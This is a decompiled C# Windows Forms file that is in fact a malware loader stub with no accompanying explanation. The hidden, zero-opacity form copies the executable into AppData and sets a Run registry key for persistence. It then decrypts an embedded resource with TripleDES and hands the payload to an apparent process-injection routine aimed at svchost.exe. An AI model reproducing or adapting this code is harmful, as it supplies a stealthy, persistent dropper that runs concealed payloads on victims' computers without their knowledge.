using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DLLRun;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using o.My.Resources;

namespace o;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	public static string xx = Application.get_StartupPath();

	public string MyFileName;

	public string MyKeyName;

	private string hem;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		MyFileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\lr.exe";
		MyKeyName = "dfdfdf";
		hem = Conversions.ToString(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)[0]) + ":\\Windows\\system32\\svchost.exe";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(14, 11);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void CopyS(string x)
	{
		try
		{
			if (File.Exists(x))
			{
				File.Delete(x);
			}
			File.Copy(Application.get_ExecutablePath(), x);
			Interaction.Shell(x, (AppWinStyle)2, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	public void RegistryON(string x, string y)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(x, y);
		registryKey.Close();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		RegistryON(MyKeyName, MyFileName);
		if (Operators.CompareString(Application.get_ExecutablePath(), MyFileName, false) != 0)
		{
			CopyS(MyFileName);
			ProjectData.EndApp();
		}
		try
		{
			byte[] array = Convert.FromBase64String(Lylia.TripleDes(Resources._1, "password", false));
			mainsub.samet29(array, hem);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}
}
